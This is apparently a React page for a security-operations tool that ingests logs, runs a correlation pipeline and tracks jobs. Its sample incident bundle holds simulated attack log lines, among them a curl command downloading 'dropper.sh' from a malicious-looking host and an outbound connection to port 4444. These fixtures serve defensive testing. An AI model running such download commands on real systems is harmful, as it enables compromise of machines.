import {useCallback, useEffect, useRef, useState} from "react";
import {useNavigate} from "react-router-dom";
import {api, apiErrorMessage} from "../lib/api";
import {toast} from "sonner";
import {Archive, FileArrowUp, Files, X} from "@phosphor-icons/react";
import {PageHeader} from "../design-system";

const STEPS = [
    ["queued", "Queued"],
    ["parsing", "Parsing"],
    ["extracting", "Extracting"],
    ["correlating", "Correlating"],
    ["enriching", "Enriching"],
    ["generating", "Playbook"],
    ["done", "Complete"],
];

const SAMPLE_APACHE = `45.155.205.199 - - [01/Feb/2026:09:12:44 +0000] "GET /wp-admin HTTP/1.1" 403 512
45.155.205.199 - - [01/Feb/2026:09:12:47 +0000] "POST /wp-login.php HTTP/1.1" 401 234
45.155.205.199 - - [01/Feb/2026:09:12:50 +0000] "POST /wp-login.php HTTP/1.1" 200 8912
`;
const SAMPLE_SYSLOG = `Feb  1 09:13:02 web01 sshd[2211]: Failed password for root from 45.155.205.199 port 34521 ssh2
Feb  1 09:13:05 web01 sshd[2211]: Failed password for admin from 45.155.205.199 port 34521 ssh2
Feb  1 09:13:44 web01 bash[3120]: /usr/bin/curl -sSL http://malicious-hive.top/dropper.sh -o /tmp/x.sh
Feb  1 09:14:10 web01 kernel: outbound connection to 185.220.101.44:4444 CVE-2021-44228
`;
const SAMPLE_CSV = `timestamp,action,src_ip,dst_ip,dst_port,protocol
2026-02-01T09:14:10,BLOCK,45.155.205.199,10.0.0.5,4444,tcp
2026-02-01T09:14:12,BLOCK,45.155.205.199,10.0.0.5,4444,tcp
2026-02-01T09:15:00,ALLOW,10.0.0.5,185.220.101.44,443,tcp
`;

function fmtSize(n) {
    if (n < 1024) return `${n} B`;
    if (n < 1024 * 1024) return `${(n / 1024).toFixed(1)} KB`;
    return `${(n / 1024 / 1024).toFixed(2)} MB`;
}

export default function Upload() {
    const [jobs, setJobs] = useState([]);
    const [queue, setQueue] = useState([]); // pending files
    const [dragOver, setDragOver] = useState(false);
    const [uploading, setUploading] = useState(false);
    const inputRef = useRef(null);
    const nav = useNavigate();
    // Track last-seen job statuses so we can toast when a background job fails
    const prevStatusRef = useRef({});

    const refresh = useCallback(
        () =>
            api
                .get("/logs/jobs", {silentError: true})
                .then((r) => {
                    const next = Array.isArray(r.data) ? r.data : [];
                    const prev = prevStatusRef.current || {};
                    next.forEach((j) => {
                        if (!j?.id) return;
                        const was = prev[j.id];
                        if (j.status === "failed" && was && was !== "failed") {
                            toast.error(`Pipeline failed: ${j.filename || j.id.slice(0, 8)}`, {
                                description: j.error || "See job details for the error message.",
                                duration: 9000,
                                id: `job-fail-${j.id}`,
                            });
                        }
                        if (j.status === "done" && was && was !== "done" && was !== "failed") {
                            toast.success(`Pipeline complete: ${j.filename || j.id.slice(0, 8)}`, {
                                id: `job-done-${j.id}`,
                            });
                        }
                    });
                    const map = {};
                    next.forEach((j) => {
                        if (j?.id) map[j.id] = j.status;
                    });
                    prevStatusRef.current = map;
                    setJobs(next);
                })
                .catch(() => {
                    // Keep existing list on transient poll failures
                }),
        [],
    );

    useEffect(() => {
        refresh();
        const t = setInterval(refresh, 3000);
        return () => clearInterval(t);
    }, [refresh]);

    const addFiles = useCallback((fs) => {
        const arr = Array.from(fs || []);
        setQueue((prev) => [...prev, ...arr].slice(0, 20));
    }, []);

    const removeQueued = (idx) => setQueue((q) => q.filter((_, i) => i !== idx));

    const resumeJob = useCallback(
        async (jobId) => {
            try {
                await api.post(`/logs/jobs/${jobId}/resume`);
                toast.success("Job re-queued — pipeline will resume shortly");
                refresh();
            } catch (e) {
                toast.error(e?.userMessage || apiErrorMessage(e, "Could not resume job"));
            }
        },
        [refresh],
    );

    const submit = useCallback(async () => {
        if (queue.length === 0) return;
        setUploading(true);
        const fd = new FormData();
        queue.forEach((f) => fd.append("files", f));
        try {
            const r = await api.post("/logs/upload-batch", fd, {
                headers: {"Content-Type": "multipart/form-data"},
            });
            toast.success(`Uploaded ${queue.length} file(s) — pipeline running (${r.data.mode} mode)`);
            setQueue([]);
            refresh();
        } catch (e) {
            toast.error(e?.userMessage || apiErrorMessage(e, "Upload failed"));
        } finally {
            setUploading(false);
        }
    }, [queue, refresh]);

    const loadSampleBundle = useCallback(() => {
        const mk = (name, content, type = "text/plain") =>
            new File([new Blob([content], {type})], name, {type});
        setQueue([
            mk("apache.log", SAMPLE_APACHE),
            mk("syslog.log", SAMPLE_SYSLOG),
            mk("firewall.csv", SAMPLE_CSV, "text/csv"),
        ]);
        toast.info("3-file incident bundle staged — click Run pipeline");
    }, []);

    return (
        <div data-testid="upload-page">
            <PageHeader
                testid="upload-header"
                title="Ingest Logs"
                icon={FileArrowUp}
                subtitle="Drop a single log, multiple logs, or an incident-package ZIP. Formats auto-detected (Apache, Nginx, Syslog, JSON, CSV, CEF, LEEF, CloudTrail). Events normalize into CES and correlate into a single incident."
            />

            <div className="grid grid-cols-1 lg:grid-cols-5 gap-6">
                <div className="lg:col-span-2 space-y-4">
                    <div
                        data-testid="drop-zone"
                        onDragOver={(e) => {
                            e.preventDefault();
                            setDragOver(true);
                        }}
                        onDragLeave={() => setDragOver(false)}
                        onDrop={(e) => {
                            e.preventDefault();
                            setDragOver(false);
                            addFiles(e.dataTransfer.files);
                        }}
                        onClick={() => inputRef.current?.click()}
                        className={`soc-card p-8 border-dashed cursor-pointer transition-colors ${
                            dragOver ? "border-primary/60 bg-primary/5" : "hover:border-primary/40"
                        }`}
                    >
                        <input
                            type="file"
                            multiple
                            ref={inputRef}
                            className="hidden"
                            data-testid="file-input"
                            onChange={(e) => addFiles(e.target.files)}
                        />
                        <div className="flex items-start gap-3">
                            <FileArrowUp size={36} className="text-primary shrink-0"/>
                            <div>
                                <div className="font-semibold text-lg leading-tight">
                                    Drop logs or a ZIP package
                                </div>
                                <div className="text-xs text-muted-foreground mt-1">
                                    Single file, multi-file, or incident-package ZIP · max 20 files · 25 MB each
                                </div>
                            </div>
                        </div>
                        <div
                            className="mt-5 flex flex-wrap items-center gap-2 text-[10px] uppercase tracking-[0.14em] text-muted-foreground">
                            <span className="px-2 py-0.5 rounded border border-border">apache</span>
                            <span className="px-2 py-0.5 rounded border border-border">syslog</span>
                            <span className="px-2 py-0.5 rounded border border-border">json</span>
                            <span className="px-2 py-0.5 rounded border border-border">csv</span>
                            <span className="px-2 py-0.5 rounded border border-border">cef</span>
                            <span className="px-2 py-0.5 rounded border border-border">leef</span>
                            <span className="px-2 py-0.5 rounded border border-border">cloudtrail</span>
                            <span className="px-2 py-0.5 rounded border border-border">zip</span>
                        </div>
                    </div>

                    {queue.length > 0 && (
                        <div className="soc-card p-4">
                            <div className="flex items-center justify-between mb-3">
                                <div className="soc-label">Staged files ({queue.length})</div>
                                <div className="flex items-center gap-2">
                                    <button
                                        data-testid="clear-queue"
                                        onClick={() => setQueue([])}
                                        className="text-[11px] text-muted-foreground hover:text-error transition-colors"
                                    >
                                        Clear
                                    </button>
                                    <button
                                        data-testid="submit-batch"
                                        onClick={submit}
                                        disabled={uploading}
                                        className="text-xs px-3 py-1.5 bg-primary hover:bg-primary/90 text-primary-foreground font-semibold rounded transition-colors disabled:opacity-50"
                                    >
                                        {uploading ? "Uploading…" : "Run pipeline →"}
                                    </button>
                                </div>
                            </div>
                            <div className="space-y-1.5 max-h-56 overflow-y-auto">
                                {queue.map((f, i) => (
                                    <div key={`${f.name}-${i}`}
                                         className="flex items-center justify-between text-[12px] px-2 py-1.5 bg-background rounded border border-border"
                                         data-testid={`staged-${i}`}>
                                        <div className="flex items-center gap-2 min-w-0">
                                            {f.name.endsWith(".zip") ? <Archive size={12} className="text-warning"/> :
                                                <Files size={12} className="text-primary"/>}
                                            <span className="soc-mono truncate">{f.name}</span>
                                        </div>
                                        <div className="flex items-center gap-3 shrink-0">
                                            <span
                                                className="text-muted-foreground font-mono text-[10px]">{fmtSize(f.size)}</span>
                                            <button onClick={() => removeQueued(i)}
                                                    className="text-muted-foreground hover:text-error transition-colors">
                                                <X size={12}/>
                                            </button>
                                        </div>
                                    </div>
                                ))}
                            </div>
                        </div>
                    )}

                    <div className="soc-card p-4 text-xs text-muted-foreground leading-relaxed">
                        <div className="soc-label mb-2">Quick actions</div>
                        <button
                            data-testid="load-sample-bundle"
                            onClick={loadSampleBundle}
                            className="w-full text-left text-[12px] px-3 py-2 bg-primary/5 border border-primary/30 hover:border-primary/50 rounded transition-colors text-primary"
                        >
                            Stage 3-file bundle — Apache · Syslog · Firewall CSV
                            <div className="text-[10px] text-muted-foreground mt-0.5">Same attacker IP across all three
                                → tests cross-log correlation</div>
                        </button>
                    </div>

                    <div className="soc-card p-4 text-xs text-muted-foreground leading-relaxed">
                        <div className="soc-label mb-2">Pipeline</div>
                        <ol className="space-y-1.5">
                            <li>1. Format detection per file → CES normalization</li>
                            <li>2. Cross-log correlation (IP · user · host · hash · domain)</li>
                            <li>3. IoC extraction + parallel threat-intel enrichment</li>
                            <li>4. MITRE ATT&CK technique inference</li>
                            <li>5. Citation-grounded playbook via LLM</li>
                            <li>6. HiTL routing on critical severity / low grounding</li>
                        </ol>
                    </div>
                </div>

                <div className="lg:col-span-3 soc-card p-0">
                    <div className="px-4 py-3 border-b border-border flex items-center justify-between">
                        <div className="soc-label">Recent Jobs</div>
                        <div className="text-[10px] text-muted-foreground">auto-refresh · 2s</div>
                    </div>
                    <div className="divide-y divide-border">
                        {jobs.length === 0 && (
                            <div className="text-center text-muted-foreground text-xs py-10">No jobs yet</div>
                        )}
                        {jobs.map((j) => {
                            const idx = STEPS.findIndex(([k]) => k === j.status);
                            const isFail = j.status === "failed";
                            // Resumable when failed, or mid-pipeline with an error/requeue hint, or stuck running
                            const canResume =
                                isFail ||
                                (j.status !== "done" &&
                                    (j.queue_state === "running" ||
                                        j.error ||
                                        (j.status !== "queued" && j.progress != null && j.progress < 100)));
                            return (
                                <div key={j.id} className="p-4">
                                    <div className="flex items-center justify-between mb-2">
                                        <div className="min-w-0">
                                            <div className="flex items-center gap-2">
                                                {j.mode === "zip" ?
                                                    <Archive size={13} className="text-warning shrink-0"/> :
                                                    j.mode === "batch" ?
                                                        <Files size={13} className="text-primary shrink-0"/> : null}
                                                <div
                                                    className="text-sm font-medium text-foreground truncate">{j.filename}</div>
                                                <span
                                                    className="text-[9px] uppercase tracking-[0.14em] px-1.5 py-0.5 rounded bg-muted text-muted-foreground">
                          {j.mode || "single"}
                        </span>
                                            </div>
                                            <div className="soc-mono text-[10px] text-muted-foreground mt-0.5">
                                                {j.id.slice(0, 8)} · {fmtSize(j.size)}
                                                {j.files && j.files.length > 1 && ` · ${j.files.length} files`}
                                            </div>
                                        </div>
                                        <div className="flex items-center gap-2">
                                            {j.status === "done" && j.incident_ids?.[0] && (
                                                <button
                                                    data-testid={`job-view-${j.id}`}
                                                    onClick={() => nav(`/incidents/${j.incident_ids[0]}`)}
                                                    className="text-[11px] px-2 py-1 bg-success-soft border border-[var(--success-border)] text-success rounded hover:bg-success-soft transition-colors"
                                                >
                                                    Open incident →
                                                </button>
                                            )}
                                            {canResume && j.status !== "done" && (
                                                <button
                                                    type="button"
                                                    data-testid={`job-resume-${j.id}`}
                                                    onClick={() => resumeJob(j.id)}
                                                    className="text-[11px] px-2 py-1 bg-amber-500/10 border border-amber-500/40 text-amber-200 rounded hover:bg-amber-500/20 transition-colors"
                                                    title="Re-queue this job if the durable payload still exists"
                                                >
                                                    Resume
                                                </button>
                                            )}
                                            <span
                                                data-testid={`job-status-${j.id}`}
                                                className={`text-[10px] uppercase tracking-[0.14em] font-semibold ${
                                                    isFail ? "text-error" : j.status === "done" ? "text-success" : "text-primary"
                                                }`}
                                            >
                        {j.status}
                      </span>
                                        </div>
                                    </div>

                                    {j.files_meta?.length > 0 && (
                                        <div className="grid grid-cols-2 gap-1.5 mb-2">
                                            {j.files_meta.map((m) => (
                                                <div key={m.file}
                                                     className="text-[10px] flex items-center justify-between px-2 py-1 rounded bg-background border border-border">
                                                    <span className="soc-mono truncate">{m.file.split("/").pop()}</span>
                                                    <span className="text-primary">
                            <span className="text-muted-foreground">{m.format}</span> · {m.events}
                          </span>
                                                </div>
                                            ))}
                                        </div>
                                    )}

                                    <div className="grid grid-cols-7 gap-1">
                                        {STEPS.map(([k, label], i) => {
                                            const active = idx >= i && !isFail;
                                            const current = idx === i && !isFail && k !== "done";
                                            return (
                                                <div key={k} className="flex flex-col items-center gap-1">
                                                    <div className={`h-1 w-full rounded-full ${
                                                        isFail ? "bg-[var(--error)]/40" :
                                                            active ? "bg-primary" : "bg-muted"
                                                    } ${current ? "animate-pulse" : ""}`}/>
                                                    <div
                                                        className={`text-[9px] tracking-wider uppercase ${active ? "text-primary" : "text-muted-foreground/80"}`}>
                                                        {label}
                                                    </div>
                                                </div>
                                            );
                                        })}
                                    </div>
                                    {j.error && <div className="mt-2 text-[11px] text-error">Error: {j.error}</div>}
                                </div>
                            );
                        })}
                    </div>
                </div>
            </div>
        </div>
    );
}
